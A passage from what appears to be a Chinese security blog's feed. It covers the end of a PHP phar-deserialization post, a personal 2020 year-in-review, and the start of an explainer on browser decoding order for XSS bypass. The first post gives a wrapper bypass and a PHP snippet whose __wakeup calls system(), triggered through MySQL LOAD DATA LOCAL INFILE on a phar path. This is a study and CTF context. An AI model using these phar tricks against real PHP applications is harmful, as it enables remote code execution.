<li><p>Bzip / Gzip<br>&#x5982;&#x679C;&#x9650;&#x5236;&#x4E86;<code>phar://</code>&#x4E0D;&#x80FD;&#x51FA;&#x73B0;&#x5728;&#x5934;&#x51E0;&#x4E2A;&#x5B57;&#x7B26;&#x3002;&#x53EF;&#x7528; <code>compress.bzip2://</code> &#x548C; <code>compress.zlib://</code> &#x6DFB;&#x52A0;&#x81F3; <code>phar://</code> &#x524D;&#x9762;&#x8FDB;&#x884C; bypass<br><code>$z = &apos;compress.bzip2://phar:///home/sx/test.phar/test.txt&apos;;</code></p>
</li>
<li><p>MySQL<br><code>LOAD DATA LOCAL INFILE</code>&#x4E5F;&#x4F1A;&#x89E6;&#x53D1;&#x8FD9;&#x4E2A;<code>php_stream_open_wrapper</code><br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $s = <span class="hljs-string">&apos;&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span> <span class="hljs-params">()</span> </span>{</span><br><span class="line">        system(<span class="hljs-keyword">$this</span>-&gt;s);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, <span class="hljs-keyword">true</span>);</span><br><span class="line">$s = mysqli_real_connect($m, <span class="hljs-string">&apos;localhost&apos;</span>, <span class="hljs-string">&apos;root&apos;</span>, <span class="hljs-string">&apos;123456&apos;</span>, <span class="hljs-string">&apos;easyweb&apos;</span>, <span class="hljs-number">3306</span>);</span><br><span class="line">$p = mysqli_query($m, <span class="hljs-string">&apos;LOAD DATA LOCAL INFILE \&apos;phar://test.phar/test\&apos; INTO TABLE a  LINES TERMINATED BY \&apos;\r\n\&apos;  IGNORE 1 LINES;&apos;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
</ul>
<h3 id="&#x4F8B;&#x5B50;"><a href="#&#x4F8B;&#x5B50;" class="headerlink" title="&#x4F8B;&#x5B50;"></a>&#x4F8B;&#x5B50;</h3><p>&#x53C2;&#x8003;&#x53E6;&#x4E00;&#x7BC7; blog <a href>HITCON &#x4E09;&#x9898;&#x9012;&#x8FDB;PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;</a></p>
<p>HITCON2017 &#x4E2D;&#x7684; Baby^H Master PHP 2017 &#x4E00;&#x9898;</p>
<blockquote>
<p>refer<br><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2_1" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2_1</a><br><a href="https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/" target="_blank" rel="noopener">https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/</a><br><a href="https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/</a><br><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38</a></p>
</blockquote>
</body></html>]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>回首2020，展望2021</title>
    <url>/2021/01/08/%E5%9B%9E%E9%A6%962020%EF%BC%8C%E5%B1%95%E6%9C%9B2021/</url>
    <content><![CDATA[<html><head></head><body><p>&#x8FDF;&#x5230;&#x7684; 2020 &#x5E74;&#x672B;&#x603B;&#x7ED3;</p>
<a id="more"></a>



<h1 id="2020"><a href="#2020" class="headerlink" title="2020"></a>2020</h1><p>&#x4E00;&#x5F00;&#x59CB;&#x653E;&#x5047;&#x56DE;&#x5BB6;&#xFF0C;&#x805A;&#x9910;&#x89C1;&#x4E86;&#x5F88;&#x591A;&#x8BB8;&#x4E45;&#x6CA1;&#x89C1;&#x7684;&#x670B;&#x53CB;&#xFF0C;&#x4E4B;&#x540E;&#x56E0;&#x4E3A;&#x75AB;&#x60C5;&#x7684;&#x4F20;&#x64AD;&#x548C;&#x8513;&#x5EF6;&#xFF0C;&#x57FA;&#x672C;&#x4E0D;&#x51FA;&#x95E8;&#x4E86;</p>
<p>&#x8FD8;&#x8BB0;&#x5F97;&#x5BB6;&#x91CC;&#x5F53;&#x65F6;&#x56E4;&#x4E86;&#x597D;&#x591A;&#x4E1C;&#x897F;&#xFF0C;&#x8DB3;&#x591F;&#x5403;&#x4E0A;&#x4E00;&#x9635;&#x5B50;&#xFF0C;&#x56E0;&#x6B64;&#x6211;&#x7684; 2020 &#x7684;&#x4E0A;&#x534A;&#x5E74;&#x56E0;&#x4E3A;&#x75AB;&#x60C5;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x57FA;&#x672C;&#x4E0A;&#x90FD;&#x662F;&#x5728;&#x5BB6;&#x5EA6;&#x8FC7;&#x7684;</p>
<p>&#x540E;&#x6765;&#x9762;&#x8BD5;&#x4E86;&#x9E45;&#x5382;&#xFF0C;&#x5E76;&#x5728;&#x7B2C;&#x4E09;&#x6B21;&#x9762;&#x8BD5;&#x7684;&#x65F6;&#x5019; &#x201C;&#x6210;&#x529F;&#x201D; &#x7684;&#x628A; &#x201C;17:00&#x201D; &#x770B;&#x6210;&#x4E86;&#x665A;&#x4E0A;&#x4E03;&#x70B9;&#x949F;&#xFF0C;&#x4EE5;&#x81F3;&#x4E8E;&#x9E3D;&#x6389;&#x4E86;&#x6211;&#x4EEC;&#x90E8;&#x95E8;&#x7684; leader&#x3002;&#x73B0;&#x5728;&#x60F3;&#x60F3;&#x5F53;&#x65F6;&#x7684;&#x64CD;&#x4F5C;&#x771F;&#x662F;&#x4EE4;&#x4EBA;&#x7A92;&#x606F;&#x3002;</p>
<p>&#x4F46;&#x90E8;&#x95E8; leader &#x7684;&#x6027;&#x683C;&#x975E;&#x5E38;&#x968F;&#x548C;&#xFF0C;&#x5728;&#x6211;&#x7684;&#x9053;&#x6B49;&#x548C;&#x89E3;&#x91CA;&#x540E;&#x8FDB;&#x884C;&#x4E86;&#x7B2C;&#x4E09;&#x6B21;&#x8865;&#x9762;&#xFF0C;&#x518D;&#x540E;&#x6765;&#x6210;&#x4E3A;&#x4E86;&#x9E45;&#x5382;&#x7684;&#x4E00;&#x5458;&#x3002;</p>
<p>&#x4E4B;&#x540E;&#x5F00;&#x542F;&#x4E86;&#x4EBA;&#x751F;&#x7684;&#x7B2C;&#x4E00;&#x4EFD;&#x5DE5;&#x4F5C;&#xFF0C;&#x524D;&#x5F80;&#x6DF1;&#x5733;&#x6F02;&#x6CCA;</p>
<p>&#x6700;&#x540E;&#x5F00;&#x5B66;&#x4E86;&#xFF0C;&#x4E5F;&#x8F6C;&#x5230;&#x4E86;&#x8FDC;&#x7A0B;&#x5B9E;&#x4E60;</p>
<p>2020 &#x57FA;&#x672C;&#x6CA1;&#x6709;&#x6253; CTF&#xFF0C;&#x552F;&#x4E00;&#x4E00;&#x4E2A;&#x5F3A;&#x7F51;&#x676F;&#x7EBF;&#x4E0B;&#x7B2C;&#x4E00;&#x8F6E;&#x5C31;&#x65E0;&#x4E86;</p>
<p>&#x6BD4;&#x8D5B;&#x6162;&#x6162;&#x4ECE; CTF &#x4E09;&#x4E2A;&#x5B57;&#x6BCD;&#x8F6C;&#x5230;&#x4E86; HW &#x4E24;&#x4E2A;&#x5B57;&#x6BCD;&#xFF0C;&#x800C;&#x8D8A;&#x63A5;&#x8FD1;&#x5B9E;&#x6218;&#x4E5F;&#x5C31;&#x8D8A;&#x77E5;&#x9053;&#x4E86;&#x81EA;&#x5DF1;&#x77E5;&#x8BC6;&#x9762;&#x7684;&#x532E;&#x4E4F;</p>
<h1 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h1><p>2021&#x5E74;1&#x6708;8&#x65E5;&#xFF0C;&#x5728;&#x9E45;&#x5382;&#x7684;&#x7B2C; 262 &#x5929;&#xFF0C;&#x51C6;&#x5907;&#x63D0;&#x4EA4;&#x79BB;&#x804C;&#x7533;&#x8BF7;</p>
<p>&#x548C;&#x5927;&#x591A;&#x6570;&#x5B9E;&#x4E60;&#x751F;&#x4E00;&#x6837;&#xFF0C;&#x6211;&#x65E0;&#x6CD5;&#x5E73;&#x8861;&#x5DE5;&#x4F5C;&#x548C;&#x5B66;&#x4E60;&#x7684;&#x90A3;&#x6839;&#x6760;&#x6746;&#xFF0C;&#x9762;&#x5BF9;&#x5373;&#x5C06;&#x5230;&#x6765;&#x7684;&#x5E94;&#x5C4A;&#x751F;&#x6821;&#x62DB;&#xFF0C;&#x6211;&#x663E;&#x5F97;&#x7126;&#x8651;&#x800C;&#x4E0D;&#x5B89;&#x3002;&#x611F;&#x89C9;&#x81EA;&#x5DF1;&#x7684;&#x6210;&#x957F;&#x79BB;&#x81EA;&#x5DF1;&#x7684;&#x671F;&#x671B;&#x8FD8;&#x6709;&#x5F88;&#x957F;&#x4E00;&#x6BB5;&#x8DDD;&#x79BB;&#xFF0C;&#x56E0;&#x6B64;&#x9009;&#x62E9;&#x4E86;&#x79BB;&#x804C;&#x53BB;&#x6C89;&#x6DC0;&#x81EA;&#x5DF1;</p>
<p>&#x79BB;&#x522B;&#x7684;&#x4F24;&#x611F;&#x5F80;&#x5F80;&#x4E0D;&#x662F;&#x6765;&#x6E90;&#x4E8E;&#x4E8B;&#x60C5;&#x672C;&#x8EAB;&#xFF0C;&#x800C;&#x662F;&#x90A3;&#x4EFD;&#x79BB;&#x5F00;&#x4E60;&#x60EF;&#x7684;&#x96BE;&#x4EE5;&#x5272;&#x820D;&#x548C;&#x91CA;&#x7136;</p>
<p>&#x6211;&#x4E60;&#x60EF;&#x4E86;&#x6BCF;&#x5929;&#x51CC;&#x6668;&#x7684;&#x6253;&#x5361;&#xFF0C;&#x4E60;&#x60EF;&#x4E86;&#x6BCF;&#x5468;&#x7684;&#x5468;&#x4F1A;&#xFF0C;&#x4E60;&#x60EF;&#x4E86;&#x6CA1;&#x4E8B;&#x67E5;&#x770B;&#x6709;&#x6CA1;&#x6709;&#x65B0;&#x7684;&#x798F;&#x5229;&#xFF0C;&#x4E5F;&#x4E60;&#x60EF;&#x4E86;&#x548C;&#x90E8;&#x95E8;&#x7684;&#x4EBA;&#x76F8;&#x5904;&#x7684;&#x65F6;&#x5149;</p>
<p>&#x7A81;&#x7136;&#x611F;&#x89C9;&#x5199;&#x7684;&#x6709;&#x4E9B;&#x4F24;&#x611F;&#x4E86;&#xFF0C;&#x5176;&#x5B9E;&#x5185;&#x5FC3;&#x66F4;&#x591A;&#x7684;&#x662F;&#x91CA;&#x7136;&#x5427;&#xFF0C;&#x6211;&#x4E0D;&#x518D;&#x9700;&#x8981;&#x5B8C;&#x6210;&#x6BCF;&#x5468;&#x7684;&#x4EFB;&#x52A1;&#xFF0C;&#x6709;&#x4E86;&#x66F4;&#x591A;&#x81EA;&#x7531;&#x7684;&#x65F6;&#x95F4;&#x53BB;&#x5206;&#x914D;&#x6211;&#x60F3;&#x5B66;&#x4E60;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x8FD8;&#x9700;&#x8981;&#x5B66;&#x4E60;&#x7684;&#x4E1C;&#x897F;&#x771F;&#x7684;&#x592A;&#x591A;&#x4E86;</p>
<p>&#x79BB;&#x522B;&#x4E5F;&#x4E0D;&#x4EC5;&#x53EA;&#x662F;&#x4F24;&#x611F;&#x7684;&#xFF0C;&#x7EC4;&#x957F;&#x6B23;&#x7136;&#x63A5;&#x53D7;&#x4E86;&#x6211;&#x7684;&#x79BB;&#x5F00;&#xFF0C;&#x5E76;&#x5BF9;&#x6211;&#x5728;&#x804C;&#x671F;&#x95F4;&#x7684;&#x5DE5;&#x4F5C;&#x8868;&#x793A;&#x4E86;&#x80AF;&#x5B9A;&#x548C;&#x8D5E;&#x626C;</p>
<p>&#x90E8;&#x95E8;&#x7684;&#x6280;&#x672F;&#x548C;&#x6C1B;&#x56F4;&#x90FD;&#x662F;&#x975E;&#x5E38;&#x4E0D;&#x9519;&#x7684;&#xFF0C;&#x5F88;&#x8363;&#x5E78;&#x6709;&#x8FD9;&#x4E00;&#x6BB5;&#x5B9E;&#x4E60;&#x7ECF;&#x5386;</p>
<p>&#x6C5F;&#x6E56;&#x518D;&#x89C1;&#x5427; &#xFF5E;</p>
<p>&#x6574;&#x7406;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x6982;&#x7684;&#x6846;&#x67B6;&#xFF0C;&#x90FD;&#x662F;&#x9700;&#x8981;&#x53BB;&#x9010;&#x6B65;&#x7EC6;&#x5316;&#x7684;&#x77E5;&#x8BC6;&#x70B9;&#xFF0C;&#x8FD8;&#x6709;&#x597D;&#x591A;&#x6CA1;&#x6709;&#x5B66;&#x4E60;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x5E0C;&#x671B;&#x80FD;&#x901A;&#x8FC7;&#x4E4B;&#x540E;&#x7684;&#x65F6;&#x95F4;&#x4E00;&#x70B9;&#x4E00;&#x70B9;&#x6D88;&#x5316;&#x6389;</p>
<p>End &#xFF1A;&#x5E0C;&#x671B;2021&#x6162;&#x6162;&#x8FDB;&#x6B65;&#x5427; &#x2764;&#xFE0F;</p>
</body></html>]]></content>
  </entry>
  <entry>
    <title>浏览器解析机制与渲染过程</title>
    <url>/2020/03/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<html><head></head><body><p>&#x6D4F;&#x89C8;&#x5668;&#x7F16;&#x89E3;&#x7801;&#x4E0E;XSS bypass</p>
<a id="more"></a>

<h2 id="&#x5E8F;&#x7AE0;"><a href="#&#x5E8F;&#x7AE0;" class="headerlink" title="&#x5E8F;&#x7AE0;"></a>&#x5E8F;&#x7AE0;</h2><p>&#x8BBA;&#x4E00;&#x5F20;&#x56FE;&#x6253;&#x8D25;&#x4F60;&#x5B66; XSS &#x7684;&#x4FE1;&#x5FC3;&#x3002;&#xFF08;&#x8F6C;&#x81EA;&#x5FAE;&#x535A;<br><img src="/2020/03/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B/image-20201113201812123.png" alt="image-20201113201812123"></p>
<p>&#x9644;&#x4E0A; MDN DOM &#x4E8B;&#x4EF6;&#x53C2;&#x8003;: <a href="https://developer.mozilla.org/zh-CN/docs/Web/Events" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Events</a></p>
<p>&#x672C;&#x6587;&#x53C2;&#x8003;&#x591A;&#x7BC7;&#x6587;&#x7AE0;&#xFF0C;&#x6D89;&#x53CA;&#x76F8;&#x5173;&#x6666;&#x6DA9;&#x96BE;&#x61C2;&#x540D;&#x8BCD;&#x89E3;&#x91CA;&#xFF0C;&#x672F;&#x8BED;&#x89E3;&#x91CA;&#x3002;&#x5747;&#x662F; CTRL c v &#x3002;&#x5C5E;&#x4E8E;&#x53EA;&#x53EF;&#x610F;&#x4F1A;&#x4E0D;&#x53EF;&#x8A00;&#x4F20;&#x7684;&#x9886;&#x57DF;&#x3002;&#x5176;&#x4ED6;&#x7684;&#x77E5;&#x8BC6;&#x90FD;&#x4F1A;&#x5C3D;&#x91CF;&#x7ECF;&#x6211;&#x53E3;&#x4E2D;&#x9610;&#x8FF0;&#x7684;&#x7B80;&#x5355;&#x4E00;&#x70B9;&#x3002;</p>
<h2 id="&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;"><a href="#&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;" class="headerlink" title="&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;"></a>&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;</h2><h3 id="&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;&#x89C4;&#x5219;"><a href="#&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;&#x89C4;&#x5219;" class="headerlink" title="&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;&#x89C4;&#x5219;"></a>&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;&#x89C4;&#x5219;</h3><ul>
<li>HTML&#x89E3;&#x6790;&#x5668;&#x5BF9;HTML&#x6587;&#x6863;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#x5B8C;&#x6210;HTML&#x89E3;&#x7801;&#x5E76;&#x4E14;&#x521B;&#x5EFA;DOM&#x6811;</li>
<li>javascript &#x6216;&#x8005; CSS&#x89E3;&#x6790;&#x5668;&#x5BF9;&#x5185;&#x8054;&#x811A;&#x672C;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#xFF0C;&#x5B8C;&#x6210;JS CSS&#x89E3;&#x7801;</li>
<li>URL&#x89E3;&#x7801;&#x4F1A;&#x6839;&#x636E;URL&#x6240;&#x5728;&#x7684;&#x987A;&#x5E8F;&#x4E0D;&#x540C;&#x800C;&#x5728;JS&#x89E3;&#x7801;&#x524D;&#x6216;&#x8005;&#x89E3;&#x7801;&#x540E;</li>
</ul>
<p>&#x5F53;&#x6D4F;&#x89C8;&#x5668;&#x4ECE;&#x7F51;&#x7EDC;&#x5806;&#x6808;&#x4E2D;&#x83B7;&#x5F97;&#x4E00;&#x6BB5;&#x5185;&#x5BB9;&#x540E;&#xFF0C;&#x89E6;&#x53D1;HTML&#x89E3;&#x6790;&#x5668;&#x6765;&#x5BF9;&#x8FD9;&#x7BC7;&#x6587;&#x6863;&#x8FDB;&#x884C;&#x8BCD;&#x6CD5;&#x89E3;&#x6790;&#x3002;&#x5728;&#x8FD9;&#x4E00;&#x6B65;&#x4E2D;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x88AB;&#x89E3;&#x7801;&#x3002;&#x5728;&#x8BCD;&#x6CD5;&#x89E3;&#x6790;&#x5B8C;&#x6210;&#x540E;&#xFF0C;DOM&#x6811;&#x5C31;&#x88AB;&#x521B;&#x5EFA;&#x597D;&#x4E86;&#xFF0C;JavaScript&#x89E3;&#x6790;&#x5668;&#x4F1A;&#x4ECB;&#x5165;&#x6765;&#x5BF9;&#x5185;&#x8054;&#x811A;&#x672C;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#x3002;&#x5728;&#x8FD9;&#x4E00;&#x6B65;&#x4E2D;Unicode&#x8F6C;&#x4E49;&#x5E8F;&#x5217;&#x548C;Hex&#x8F6C;&#x4E49;&#x5E8F;&#x5217;&#x88AB;&#x89E3;&#x7801;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x6D4F;&#x89C8;&#x5668;&#x9047;&#x5230;&#x9700;&#x8981;URL&#x7684;&#x4E0A;&#x4E0B;&#x6587;&#xFF0C;URL&#x89E3;&#x6790;&#x5668;&#x4E5F;&#x4F1A;&#x4ECB;&#x5165;&#x6765;&#x89E3;&#x7801;URL&#x5185;&#x5BB9;&#x3002;&#x5728;&#x8FD9;&#x4E00;&#x6B65;&#x4E2D;URL&#x89E3;&#x7801;&#x64CD;&#x4F5C;&#x88AB;&#x5B8C;&#x6210;&#x3002;&#x7531;&#x4E8E;URL&#x4F4D;&#x7F6E;&#x4E0D;&#x540C;&#xFF0C;URL&#x89E3;&#x6790;&#x5668;&#x53EF;&#x80FD;&#x4F1A;&#x5728;JavaScript&#x89E3;&#x6790;&#x5668;&#x4E4B;&#x524D;&#x6216;&#x4E4B;&#x540E;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#x3002;</p>
<p></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line">Example A: <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;UserInput&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line">Example B: <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;window.open(&apos;UserInput&apos;)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line">Example C: <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:window.open(&apos;UserInput&apos;)&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<blockquote>
<p>&#x5728;&#x4F8B;A&#x4E2D;&#xFF0C;HTML&#x89E3;&#x6790;&#x5668;&#x5C06;&#x9996;&#x5148;&#x5F00;&#x59CB;&#x5DE5;&#x4F5C;&#xFF0C;&#x5E76;&#x5BF9;UserInput&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x8FDB;&#x884C;&#x89E3;&#x7801;&#x3002;&#x7136;&#x540E;URL&#x89E3;&#x6790;&#x5668;&#x5F00;&#x59CB;&#x5BF9;href&#x503C;&#x8FDB;&#x884C;URL&#x89E3;&#x7801;&#x3002;&#x6700;&#x540E;&#xFF0C;&#x5982;&#x679C;URL&#x8D44;&#x6E90;&#x7C7B;&#x578B;&#x662F;JavaScript&#xFF0C;&#x90A3;&#x4E48;JavaScript&#x89E3;&#x6790;&#x5668;&#x4F1A;&#x8FDB;&#x884C;Unicode&#x8F6C;&#x4E49;&#x5E8F;&#x5217;&#x548C;Hex&#x8F6C;&#x4E49;&#x5E8F;&#x5217;&#x7684;&#x89E3;&#x7801;&#x3002;&#x518D;&#x4E4B;&#x540E;&#xFF0C;&#x89E3;&#x7801;&#x7684;&#x811A;&#x672C;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x8FD9;&#x91CC;&#x6D89;&#x53CA;&#x4E09;&#x8F6E;&#x89E3;&#x7801;&#xFF0C;&#x987A;&#x5E8F;&#x662F;HTML&#xFF0C;URL&#x548C;JavaScript&#x3002;</p>
</blockquote>
<blockquote>
<p>&#x5728;&#x4F8B;B&#x4E2D;&#xFF0C;HTML&#x89E3;&#x6790;&#x5668;&#x9996;&#x5148;&#x5DE5;&#x4F5C;&#x3002;&#x7136;&#x800C;&#x63A5;&#x4E0B;&#x6765;&#xFF0C;JavaScript&#x89E3;&#x6790;&#x5668;&#x5F00;&#x59CB;&#x89E3;&#x6790;&#x5728;onclick&#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x5668;&#x4E2D;&#x7684;&#x503C;&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x5728;onclick&#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x5668;&#x4E2D;&#x662F;script&#x7684;&#x4E0A;&#x4E0B;&#x6587;&#x3002;&#x5F53;&#x8FD9;&#x6BB5;JavaScript&#x88AB;&#x89E3;&#x6790;&#x5E76;&#x88AB;&#x6267;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5B83;&#x6267;&#x884C;&#x7684;&#x662F;&#x201C;window.open()&#x201D;&#x64CD;&#x4F5C;&#xFF0C;&#x5176;&#x4E2D;&#x7684;&#x53C2;&#x6570;&#x662F;URL&#x7684;&#x4E0A;&#x4E0B;&#x6587;&#x3002;&#x5728;&#x6B64;&#x65F6;&#xFF0C;URL&#x89E3;&#x6790;&#x5668;&#x5F00;&#x59CB;&#x5BF9;UserInput&#x8FDB;&#x884C;URL&#x89E3;&#x7801;&#x5E76;&#x628A;&#x7ED3;&#x679C;&#x56DE;&#x4F20;&#x7ED9;JavaScript&#x5F15;&#x64CE;&#x3002;&#x56E0;&#x6B64;&#x8FD9;&#x91CC;&#x4E00;&#x5171;&#x6D89;&#x53CA;&#x4E09;&#x8F6E;&#x89E3;&#x7801;&#xFF0C;&#x987A;&#x5E8F;&#x662F;HTML&#xFF0C;JavaScript&#x548C;URL&#x3002;</p>
</blockquote>
<blockquote>
<p>&#x4F8B;C&#x4E0E;&#x4F8B;A&#x5F88;&#x50CF;&#xFF0C;&#x4F46;&#x4E0D;&#x540C;&#x7684;&#x662F;&#x5728;UserInput&#x524D;&#x591A;&#x4E86;window.open()&#x64CD;&#x4F5C;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5BF9;UserInput&#x591A;&#x4E86;&#x4E00;&#x6B21;&#x989D;&#x5916;&#x7684;URL&#x89E3;&#x7801;&#x64CD;&#x4F5C;&#x3002;&#x603B;&#x7684;&#x6765;&#x8BF4;&#xFF0C;&#x56DB;&#x8F6E;&#x89E3;&#x7801;&#x64CD;&#x4F5C;&#x88AB;&#x5B8C;&#x6210;&#xFF0C;&#x987A;&#x5E8F;&#x662F;HTML&#xFF0C;URL&#xFF0C;JavaScript&#x548C;URL&#x3002;</p>
</blockquote>
<h3 id="HTML-&#x89E3;&#x6790;"><a href="#HTML-&#x89E3;&#x6790;" class="headerlink" title="HTML &#x89E3;&#x6790;"></a>HTML &#x89E3;&#x6790;</h3><p>&#x6982;&#x62EC; HTML &#x4E2D;&#x4E94;&#x7C7B;&#x5143;&#x7D20;&#x3002;&#x8BE6;&#x7EC6;&#x53EF;&#x76F4;&#x63A5;&#x53C2;&#x8003;HTML5 &#x8BED;&#x6CD5;<br><a href="https://www.w3.org/html/ig/zh/wiki/HTML5/syntax" target="_blank" rel="noopener">https://www.w3.org/html/ig/zh/wiki/HTML5/syntax</a></p>
<ol>
<li>&#x7A7A;&#x5143;&#x7D20;: &#x7A7A;&#x4E00;&#x5B57;&#x4F53;&#x73B0;&#x5728;&#x4E0D;&#x80FD;&#x5BB9;&#x7EB3;&#x5185;&#x5BB9;&#x3002;&#x4E00;&#x822C;&#x7684;&#x6807;&#x7B7E;&#x7531; <code>&lt;start&gt;content&lt;/end&gt;</code>&#x8FD9;&#x6837;&#x7EC4;&#x6210;&#x3002;&#x7A7A;&#x5143;&#x7D20;&#x610F;&#x5473;&#x7740;&#x6CA1;&#x6709;&#x95ED;&#x5408;&#x6807;&#x7B7E;&#x7684;&#x6807;&#x7B7E;&#x3002;&#x5982;: <code>&lt;area&gt;</code>,<code>&lt;br&gt;</code>,<code>&lt;base&gt;</code></li>
<li>&#x539F;&#x59CB;&#x6587;&#x672C;&#x5143;&#x7D20;: &#x53EF;&#x4EE5;&#x5BB9;&#x7EB3;&#x5185;&#x5BB9;&#x3002; <code>&lt;script&gt;</code>&#x548C;<code>&lt;style&gt;</code>&#x3002;</li>
<li>RCDATA&#x5143;&#x7D20;&#xFF0C;&#x53EF;&#x4EE5;&#x5BB9;&#x7EB3;&#x6587;&#x672C;&#x548C;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x3002;<code>&lt;textarea&gt;</code>&#x548C;<code>&lt;title&gt;</code></li>
<li>&#x5916;&#x90E8;&#x5143;&#x7D20;&#xFF0C;&#x53EF;&#x4EE5;&#x5BB9;&#x7EB3;&#x6587;&#x672C;&#x3001;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x3001;CDATA&#x6BB5;&#x3001;&#x5176;&#x4ED6;&#x5143;&#x7D20;&#x548C;&#x6CE8;&#x91CA;: &#x5982; MathML&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x6216;&#x8005;SVG&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x7684;&#x5143;&#x7D20;</li>
<li>&#x57FA;&#x672C;&#x5143;&#x7D20;&#xFF0C;&#x53EF;&#x4EE5;&#x5BB9;&#x7EB3;&#x6587;&#x672C;&#x3001;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x3001;&#x5176;&#x4ED6;&#x5143;&#x7D20;&#x548C;&#x6CE8;&#x91CA;: &#x9664;&#x4E86;&#x4EE5;&#x4E0A;4&#x79CD;&#x5143;&#x7D20;&#x4EE5;&#x5916;&#x7684;&#x5143;&#x7D20;</li>
</ol>
<p>&#x4E0A;&#x9762;&#x7684;&#x5185;&#x5BB9;&#x6211;&#x63D0;&#x70BC;&#x4E86;&#x8F83;&#x4E3A;&#x964C;&#x751F;&#x7684;&#x4E13;&#x4E1A;&#x672F;&#x8BED;</p>
<ul>
<li>&#x5B57;&#x7B26;&#x5F15;&#x7528;</li>
<li>RCDATA</li>
<li>&#x5916;&#x90E8;&#x5143;&#x7D20;</li>
</ul>
